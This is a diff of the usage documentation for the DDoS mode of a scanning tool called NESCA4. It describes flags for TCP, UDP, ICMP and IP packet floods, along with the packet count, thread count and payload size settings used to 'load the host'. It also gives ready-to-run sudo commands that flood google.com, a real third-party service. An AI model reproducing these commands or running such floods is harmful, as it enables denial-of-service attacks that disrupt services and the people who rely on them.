@@ -1,41 +1,46 @@
-[oldteam & lomaster 2023]
-NESCA4 supports DDOS via the TCP, ICMP and UDP protocols.
+[oldteam & lomaster 2023].
+NESCA4 supports DDOS via TCP, ICMP, IP, and UDP protocols.
 
 1. Usage:
-    -icmp-ddos <type> Flag used to enable ICMP DDOS, and to specify the type of packets in the arguments.
-    -tcp-ddos        Flag that is used to enable TCP DDOS.
-    -udp-ddos        Flag that is used to enable UDP DDOS.
+    -ip <proto>      Flag used to enable IP DDOS, and specify the protocol in the arguments,
+                     it will send empty IP packets.
 
+    -icmp <type>     Flag used to enable ICMP DDOS, and specify the type of packets in the arguments.
+    -tcp             Flag used to enable TCP DDOS.
+    -udp             Flag used to enable UDP DDOS.
 
-    -ddos-len <num>  Flag that is used to specify the number of packets, their number is specified in its arguments.
-    -TDD <num>       Flag that is used to specify the maximum number of threads (packets at a time),
-                     the number is passed in its arguments.
+    -count <num>     Flag used to specify the number of packets whose number is specified in the arguments.
+    -TDD <num>       Flag used to specify the maximum number of streams (packets at a time),
+                     the number passed in the arguments.
 
-  But this is not enough to load the host, you need to increase the packet size.
+  But this is not enough for the host load, it is necessary to increase the packet size.
 
-    -data-len <num>  Flag that allows to fill the packet with random characters,
-                the number of these characters is specified in its arguments.
+    -data-len <num>  Flag that allows filling the packet with random characters,
+                  the number of these characters is specified in the arguments.
 
-  Here is an example of a command for ICMP DDOS:
-    sudo ./nesca4 google.com -icmp-ddos -ddos-len 10000 -data-len 1400
+  Example command for ICMP DDOS:
+    sudo ./nesca4 google.com -icmp -count 10000 -data-len 1400
 
-  Example for TCP DDOS:
-    sudo ./nesca4 google.com -tcp-ddos -ddos-len 10000 -data-len 1400 -p 80
+  Example for a TCP DDOS attack:
+    sudo ./nesca4 google.com -tcp -count 10000 -data-len 1400 -p 80
 
-  Example for UDP DDOS:
-    sudo ./nesca4 google.com -udp-ddos -ddos-len 10000 -data-len 1400 -p 53
+  Example for a UDP DDOS:
+    sudo ./nesca4 google.com -udp -count 10000 -data-len 1400 -p 53
+
+  Example for an IP DDOS attack:
+    sudo ./nesca4 google.com -ip 4 -count 10000 -data-len 1400
 
 2. Features:
-  Specifying -data-len greater than 1400 is not recommended, the system starts rejecting packets.
-  If you specify multiple DDOS targets, NESCA4 will load them all, first sending the specified number
-  of packets to the first host, then to the second, and so on.
+  Specifying -data-len greater than 1400 is not recommended, the system will start rejecting packets.
+  If you specify multiple DDOS targets, NESCA4 will load them all, first sending the specified number of
+  packets to the first host, then to the second host, and so on.
 
-  It is also worth saying that TCP DDOS will take into account the first specified port, let's say you
-  specified -p 80,443,21. DDOS will be exactly on port 80.
+  It's also worth mentioning that TCP DDOS will honor the first port specified, let's say you
+  specified -p 80,443,21. The DDOS will be on port 80.
 
-  Also almost all other arguments for port scan, like -frag, or -ack, or -scanflags are supported for DDOS as well.
+  Also almost all other scan arguments, such as -frag, or -ack, or -scanflags, are supported for DDOS as well.
 
 3. Default values:
-  * By standard, -ddos-len is worth 5000 packets.
-  * By standard -TDD stands at 500 threads.
-  * By standard -data-len is set to 0, it is disabled.
+  * By default -count has a value of 5000 packets.
+  * By standard -TDD is set to 500 threads.
+  * By default -data-len is set to 0, disabled the hell out of it.
